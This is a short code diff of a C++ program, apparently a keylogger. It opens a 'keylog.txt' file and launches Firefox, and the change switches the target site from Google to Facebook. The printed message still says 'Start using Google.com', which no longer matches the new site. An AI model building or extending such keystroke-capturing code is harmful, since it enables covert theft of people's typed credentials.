@@ -10,8 +10,8 @@ int main() {
 
     std::ofstream log_file("keylog.txt");
 
-    // Open Google website
-    system("firefox https://www.google.com");
+    // Open  website
+    system("firefox https://www.facebook.com");
     std::cout << "Start using Google.com" << std::endl;
     sleep(5); // wait for 5 seconds for the user to start interacting with the website
 
